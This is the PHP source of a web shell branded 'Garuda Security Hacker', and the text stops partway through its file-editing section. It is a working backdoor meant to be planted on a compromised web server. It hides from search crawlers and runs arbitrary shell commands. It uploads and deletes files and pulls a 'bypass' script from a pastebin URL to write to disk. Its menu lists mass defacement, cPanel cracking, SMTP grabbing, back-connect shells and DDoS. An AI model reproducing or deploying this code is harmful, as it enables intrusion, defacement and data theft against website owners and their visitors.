<?php
$auth_pass = "d10d6b075de8234f2d33d8246aba5800";
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
<title>Garuda Security Hacker</title>
<style type="text/css">
html {
	 background: url(https://2.bp.blogspot.com/-IpCmGxpmpEs/V-6npVXaRsI/AAAAAAAAAH8/Z0iQuic4Xu4HxSA3TxVm0K1UkEoSvYEpQCLcB/s1600/14203335_1853548591539635_3215370995956896280_n.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
html,body{margin:0;padding:0;height:100%;font:13px Arial;}
#wrapper{min-height:100%;position:relative;}
#header{background:#f0f0f0;padding:5px;height:50px;color:#3000ff;}
#body{padding-bottom:40px;padding-left:10px;}
#footer{background:#f0f0f0;position:absolute;bottom:0;width:100%;
   text-align:center;color:#408080;}
header {
	color: green;
	margin: 10px auto;
}
fieldset {
    width: 250px;
    height: 140px;
	background: silver;
	padding:4px 20px;
	margin:0;
	color:cinnamon;
	letter-spacing:1px;
	 border: 1px solid #00ff00;box-shadow: 0px 0px 15px aqua;
	text-decoration: none;

}
body{cursor: url(http://cur.cursors-4u.net/toons/too-12/too1107.cur), progress !important;}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: #000000;
	border: 1px dotted green;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
input[type=text] {
	width: 250px;
	height: 25px;
	color: red;
	background: #000000;
	border: 1px dotted green;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>

<center>
<font face="monospace"><br>
<a href="https://garudasecurityhacker.blogspot.com" target="blank"><font color="white">Silahkan login Terlebih dahulu.</a>

<header>
<pre>
	</pre>
</header>
<br><br><br><br><br><br><br><br>
<fieldset>
			<label for="login">Username</label>
		<form method="post">
<input type="text" name="id" value="Garuda Security Hacker">
</form>
Password
<form method="post">
<input type="password" name="pass"> <br><br>
<input type="submit" value="Login">
</fieldset>
</form>
<style>
</style>
</head>
<body> 
 <div id="footer" color=Red size=3><b>Copyright &copy 2017 - Garuda Security Hacker<br></p></div>
 <div id="footer" color=Red size=3><b>All Rights Reserved.</></div>
</font>
</body>
</head>
<table border="0" cellspacing="1" cellpadding="4" class="tborder"><tr><td class="thead"><strong></strong></td></tr><tr><td class="trow1"></a></td></tr></table><br />
<table border="0" cellspacing="1" cellpadding="4" class="tborder">
<tbody><tr>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>Garuda Security Hacker</title>
<meta name='author' content='IndoXploit'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
	 background: url(https://1.bp.blogspot.com/-YdlUZjkuAho/WLgsj13ExrI/AAAAAAAAAkA/dkCeg0U-5W0i4Qb1N2q7VM0Vt_etK_Z7wCLcB/s1600/16402853_779290608891443_1991128084586875543_o.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
body {
     text-align: center;
	resize: none;
	text-shadow: 2px 4px 10px;
}
select {
    width: 152px;
    background: #000000;
    color: lime;
    border: 1px solid #ffffff;
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'Ubuntu';
    font-size: 13px;
}
.terimakasih {
    border: 1px solid #5cb85c;
    border-radius :4px;
    width: 550px;
	  border: 1px solid #00ff00;box-shadow: 0px 0px 15px white;
    height: 100px;
}

th {
    padding: 10px;
}
.php
*{
	font-size:12px;
	font-family:Tahoma,Verdana,Arial;
}
textarea {
	border: 1px solid #FFFF00;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #FFFF00;
	font-family: 'Ubuntu';
	font-size: 13px;
}
a {
	color: lime;
	text-decoration: none;
}
li {
    display: inline;
    margin: 5px;
    padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
	 border: 1px solid #00ff00;box-shadow: 0px 0px 15px blue;
	 
}
a:hover {cursor: url(http://cur.cursors-4u.net/toons/too-12/too1107.cur), progress !important;}
body{cursor: url("http://downloads.totallyfreecursors.com/thumbnails/aliendance.gif"), auto;}
th {
	padding: 10px;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
.table_home, .th_home, .td_home {
	border: 1px solid blue;
}
#menu a{
	padding:4px 20px;
	margin:0;
	background:#222222;
	letter-spacing:1px;
		width: 100%;
	height: 170px;
	 border: 1px solid #00ff00;box-shadow: 0px 0px 15px lime;
	color: orange;
	text-decoration: none;
}
#kotak{
	margin:0;
	letter-spacing:1px;
	height: 138px;
	color:silver;
	 border: 1px solid blue;box-shadow: 0px 0px 15px red;
	 text-decoration: none;
}
.td_home{
	margin:0;
	color:cinnamon;
	letter-spacing:1px;
	 border: 1px solid #00ff00;box-shadow: 0px 0px 15px aqua;
	text-decoration: none;
}
.th_home{
		background:red;
	margin:0;
	color:gold;
	letter-spacing:1px;
	text-decoration: none;
}
</style>
</head>
<?php

function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
function bing($dork) {
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
	    if($x) {
			preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
			foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
			$npage = $npage + 10;
			if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
		} else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
 	$sss = count(array_unique($array));
	foreach($array as $domain) {
		echo $domain."\n";
	}
}
function reverse($url) {
	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
		  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
		  curl_setopt($ch, CURLOPT_HEADER, 0);
		  curl_setopt($ch, CURLOPT_POST, 1);
	$resp = curl_exec($ch);
	$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
	$array = explode(",,", $resp);
	unset($array[0]);
	foreach($array as $lnk) {
		$lnk = "http://$lnk";
		$lnk = str_replace(",", "", $lnk);
		echo $lnk."\n";
		ob_flush();
		flush();
	}
		curl_close($ch);
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
	$_COOKIE = idx_ss($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=red>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo '<center><div id="kotak">';
echo "System: <font color=lime>".$kernel."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
echo '<center><div id="menu">';
echo "<ul><br>";
echo "<a href='?'>Home</a>";
echo "<a href='?dir=$dir&do=upload'>Upload</a>";
echo "<a href='?dir=$dir&do=cmd'>Command</a>";
echo "<a href='?dir=$dir&do=mass_deface'>Mass Deface</a>";
echo "<a href='?dir=$dir&do=mass_delete'>Mass Delete</a>";
echo "<a href='?dir=$dir&do=config'>Config</a>";
echo "<a href='?dir=$dir&do=jumping'>Jumping</a>";
echo "<a href='?dir=$dir&do=cpanel'>CPanel Crack</a>";
echo "<a href='?dir=$dir&do=smtp'>SMTP Grabber</a>";
echo "<a href='?dir=$dir&do=cgi'>CGI Telnet</a> ";
echo "<br><br><a href='?dir=$dir&do=fake_root'>Fake Root</a>";
echo "<a href='?dir=$dir&do=krdp_shell'>KRDP Shell</a>";
echo "<a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a>";
echo "<a href='?dir=$dir&do=auto_wp'>Auto Edit Title</a>";
echo "<a href='?dir=$dir&do=zoneh'>Zone-H</a>";
echo "<a href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a>";
echo "<a href='?dir=$dir&do=cpftp_auto'>CFTP Auto Deface</a>";
echo "<br><br><a href='?dir=$dir&do=krdp_shell'>KRDP Shell</a>";
echo "<a href='?dir=$dir&do=network'>network</a>";
echo "<a href='?dir=$dir&do=about'>about</a>";
echo "<a href='?dir=$dir&do=adminer'>Adminer</a>";
echo "<a href='?dir=$dir&do=tool'>Tool</a>";
echo "<a href='?dir=$dir&do=admf'>Admin Finder</a>";
echo "<a href='?dir=$dir&do=symlink'>symlink</a>";
echo "<a href='?dir=$dir&do=autoklik'>Auto Deface</a>";
echo "<br><br><a href='?dir=$dir&do=whois'>Whois</a>";
echo "<a href='?dir=$dir&do=csrf'>CSRF Online</a>";
echo "<a href='?dir=$dir&do=ende'>Encode Decode</a>";
echo "<a href='?dir=$dir&do=ddos'>DDos</a>";
echo "<a href='?dir=$dir&do=shellscanner'>Shell Scanner</a>";
echo "<a href='?dir=$dir&do=ende'>Encode Decode</a><br><br>";
echo "<a href='?xp=bypassserver'>Full bypass</a>";
echo "<a href='?dir=$dir&do=defacerid'>DefacerID</a>";
echo "<a href='?dir=$dir&do=bconnet'>Back Connect</a>";
echo "<a href='?dir=$dir&do=reverse'>Reverse IP</a>";
echo "<a style='color: red;' href='?logout=true'>Logout</a>";
echo "</ul>";
echo "</div>";
if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
} elseif($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "Upload File:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
	echo "</center>";
}
function parah($pastebin, $nama_file){
	$usa = file_get_contents("$pastebin");
	$frr = fopen("$nama_file", 'w');
	fwrite($frr, $usa);
}
$xp = @$_GET['xp'];
if($xp == "bypassserver"){
			$config = parah("http://pastebin.com/raw/3g9HchNP", "bypass.php");
       echo '<center><font color =red><a href="bypass.php" target="_blank">Clik Here To Switch Bypass</a><br></font></center>';
} elseif($_GET['do'] == 'whois') {
@set_time_limit(0);
   @error_reporting(0);
   function sws_domain_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/whois/$site");
   flush();
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_net_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/asinfo/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_site_ser($site)
   {
   $getip = @file_get_contents("http://networktools.nl/reverseip/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_sup_dom($site)
   {
   $getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
   $ip = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');
   return $ip;
   flush();
   }
   function sws_port_scan($ip)
   {
   $list_post = array('80','21','22','2082','25','53','110','443','143');
   foreach ($list_post as $o_port)
   {
   $connect = @fsockopen($ip,$o_port,$errno,$errstr,5);
   if($connect)
   {
   echo ' $ip : $o_port ??? <u style="color: blue">Open</u> <br /><br />';
   flush();
   }
   }
   }
   function findit($mytext,$starttag,$endtag) {
   $posLeft = @stripos($mytext,$starttag)+strlen($starttag);
   $posRight = @stripos($mytext,$endtag,$posLeft+1);
   return @substr($mytext,$posLeft,$posRight-$posLeft);
   flush();
   }
   echo '<br><br><center>';
   echo '
    <br />
    <div class="sc"><form method="post"><table>
    <tr><th colspan="5" style="border: 2px lime dotted;">Whois Site</th></tr>
    <tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:white;" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:white;background-color:#000000" name="scan" value="Scan !" /></td></tr>
    </table></form></div>';
   if(isset($_POST['scan']))
   {
   $site = @htmlentities($_POST['site']);
   if (empty($site)){die('<br /><br /> Not add IP .. !');}
   $ip_port = @gethostbyname($site);
   echo "
   <br /><div class='sc2'>Scanning [ $site ip $ip_port ] ... </div>
   <div class='tit'> <br /><br />|-------------- Port Server ------------------| <br /></div>
   <div class='ru'> <br /><br /><pre>
   ";
   echo "".sws_port_scan($ip_port)." </pre></div> ";
   flush();
   echo '<div class="tit"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
   <div class="ru">
   <pre>".sws_domain_info($site)."</pre></div>';
   flush();
   echo '
   <div class="tit"> <br /><br />|-------------- Network Info ------------------| <br /></div>
   <div class="ru">
   <pre>".sws_net_info($site)."</pre> </div>';
   flush();
   echo '<div class="tit"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
   <div class="ru">
   <pre>".sws_sup_dom($site)."</pre> </div>';
   flush();
   echo '<div class="tit"> <br /><br />|-------------- Site Server ------------------| <br /></div>
   <div class="ru">
   <pre>".sws_site_ser($site)."</pre> </div>
   <div class="tit"> <br /><br />|-------------- END ------------------| <br /></div>';
   flush();
   }
    echo '</center>';

} elseif($_GET['do'] == 'whois') {
?>
<body >
<center>
<br>
<form method="post"><br>
<textarea class='inputz' cols=30 rows=5 name="mbutt" style="background:transparent;color:aqua;"></textarea><br><br>
<select class='inputz' size="1" name="ope" style="background:red;color:aqua;">
<option style='background:transparent;color:aqua;'><center>[#] Encryption [#]</option>
<option value="urlencode" style='background:transparent;color:aqua;'>url</option>
<option value="base64" style='background:transparent;color:aqua;'>Base64</option>
<option value="ur" style='background:transparent;color:aqua;'>convert_uu</option>
<option value="json" style='background:transparent;color:aqua;'>json</option>
<option value="gzinflates" style='background:transparent;color:aqua;'>gzinflate - base64</option>
<option value="str2" style='background:transparent;color:aqua;'>str_rot13 - base64</option>
<option value="gzinflate" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - base64</option>
<option value="gzinflater" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - base64</option>
<option value="gzinflatex" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - gzinflate - base64</option>
<option value="gzinflatew" style='background:transparent;color:aqua;'>str_rot13 - convert_uu - url - gzinflate - str_rot13 - base64 - convert_uu - gzinflate - url - str_rot13 - gzinflate - base64</option>
<option value="str" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="url" style='background:transparent;color:aqua;'>base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
<option value="hexencode" style='background:transparent;color:aqua;'>Hex Encode/Decode</option>
<option value="md5" style='background:transparent;color:aqua;'><center>MD5 Hash</option>
<option value="sha1" style='background:transparent;color:aqua;'>SHA1 Hash</option>
<option value="str_rot13" style='background:transparent;color:aqua;'>ROT13 Hash</option>
<option value="strlen" style='background:transparent;color:aqua;'>strlen</option>
<option value="xxx" style='background:transparent;color:aqua;'>unescape</option>
<option value="bbb" style='background:transparent;color:aqua;'>charAt</option>
<option value="aaa" style='background:transparent;color:aqua;'>chr - bin2hex - substr</option>
<option value="www" style='background:transparent;color:aqua;'>chr</option>
<option value="sss" style='background:transparent;color:aqua;'>htmlspecialchars</option>
<option value="eee" style='background:transparent;color:aqua;'>escape</option></select><br><input class='inputzbut' type='submit' name='submit' value='Encode' style="background:transparent;color:aqua;">
<input class='inputzbut' type='submit' name='crack' value='Decode' style="background:transparent;color:aqua;"><br>
</select>&nbsp;
</form>
<?php 
$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_encode($text);
break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
break;case 'json' : $codi=json_encode(utf8_encode($text));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
break;case 'str2' : $codi=base64_encode(str_rot13($text));
break;case 'urlencode' : $codi=rawurlencode($text);
break;case 'hexencode' : $codi=bin2hex($text);
break;case 'md5' : $codi=md5($text);
break;case 'ur' : $codi=convert_uuencode($text);
break;case 'str_rot13' : $codi=str_rot13($text);
break;case 'sha1' : $codi=sha1($text);
break;case 'strlen' : $codi=strlen($text);
break;case 'xxx' : $codi=strlen(bin2hex($text));
break;case 'bbb' : $codi=htmlentities(utf8_decode($text));
break;case 'aaa' : $codi=chr(bin2hex(substr($text)));
break;case 'www' : $codi=chr($text);
break;case 'sss' : $codi=htmlspecialchars($text);
break;case 'eee' : $codi=addslashes($text);
break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
break;default:break;}}

$submit = $_POST['crack'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'json' : $codi=utf8_dencode(json_dencode($text));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
break;case 'str2' : $codi=str_rot13(base64_decode($text));
break;case 'urlencode' : $codi=rawurldecode($text);
break;case 'hexencode' : $codi=quoted_printable_decode($text);
break;case 'ur' : $codi=convert_uudecode($text);
break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
break;default:break;}}
$html = htmlentities(stripslashes($codi));
echo "<from><center><h3><font size=4 face=chiller color=aqua>Garuda Security Hacker</h3></center><textarea cols=70 rows=20 style='onfocus();font-weight:bold;color:red;background-image: transparent;opacity:0.40;background-size:100%;background-repeat: no-repeat;' class='inputz' readonly>".$html."</textarea><BR/><BR/></center></from>";
?>
<footer style="text-shadow: 0 0 6px #FF0000, 0 0 5px #FF0000, 0 0 5px #FF0000; position:fixed; left:1px; right:0px; top:0px; border-bottom: 1px solid red ;">
<center><b><font face="Quicksand" color="black" size="3" style="text-shadow: 0 0 5px #2f2b2b, 0 0 10px #2f2b2b, 0 0 20px #2f2b2b, 0 0 45px #2f2b2b, 0 0 40px #2f2b2b;">
<font face="Agency FB" color="red" size="4" style="text-shadow: 0 0 6px black, 0 0 5px black, 0 0 5px black;"></footer>
<?php
	} elseif($_GET['do'] == 'shellscanner') {
?>
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features)
}
//-->
</script>
<style type="text/css">
<!--
.single{
   border: 1px solid #00ff00;box-shadow: 0px 0px 15px #55FF55;
   padding: 5px;
}
.me  {
   font-size:11px; font-family:Tahoma,Verdana,Arial; color:#ccff99; 
   border: 0px;
   padding: 5px;
}

.isi{
   padding: 2px;
   border:1px solid #666666;
   font-family: Tahoma;
   color: #ccff99;
   background-color: #666666;
   font-size: 10px;
   font-weight: bold;
}
-->
</style>
<style type="text/css">
#patch {position:absolute; height:1; width:1px; top:0; left:0;}
</style>
</head>
<body>
<center>
<img src="http://i1159.photobucket.com/albums/p622/dvildance/aSSD_zps055e1ce7.gif">
<center><font color="#339900" size="14" face="arial">Backdoor Scanner</font></center><br>
<?php
if(isset($_REQUEST['edit']) && $_REQUEST['edit']=='file'){
   if(isset($_POST['yes'])){
      $filename = $_GET['file'];
      echo "<br><br><br><font color=red size=3><b><center>".$filename." deleted...</b></font><br><br><br><br><br><br><br>";
      unlink($filename);
      echo "<META HTTP-EQUIV=Refresh CONTENT=\"2; URL=javascript:window.close();\">";
   }else{
      if($_POST['update']) {
         $filename = $_POST['file'];
         if(is_writable($filename)) {
            $handle = fopen($filename, "w+");
            $isi=$_POST['content'];
            fwrite($handle, stripslashes($isi));
            fclose($handle);
            $stat= "<center><strong>edited successfully<br>";
         } else {
            $stat= "<center><font color=red><strong>Error! File may not be writable.</font></center>";
         }
      }
      if($_POST['close']) {
         echo "<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=javascript:window.close();\">";
      }
      $filename = $_GET['file'];
      if (file_exists($filename)){
         $vuln = $_GET['bug'];
         $handle = fopen($filename, "r");
         $contents = fread($handle, filesize($filename));
      ?>
      <center>
      <table>
         <tr><td align="left" class="me"><strong><?=$filename?>&nbsp;&nbsp;>> Contains :&nbsp;<?=$vuln?></strong></td></tr>
         <tr><td class="me">
            <form method="post" action="">
            <input type="hidden" name="file" value="<?=$filename?>">
            <textarea name="content" cols="80" rows="15"><?=htmlspecialchars($contents)?></textarea><br>
         </td></tr>
         <tr><td align="center" class="me">
         <?php
         if($_POST['delete']) {
            echo "Are you sure to delete ".$filename." ?";
         ?>
         <tr><td align="center" class="me">
            <input type="submit" name="yes" value=" Y E S ">
            <input type="submit" name="no" value=" N O ">
         </td></tr>
         <?php
         }else{
         echo $stat;
         ?>
         </td></tr>
         <tr><td align="right" class="me">
            <input type="submit" name="close" value=" C l o s e ">
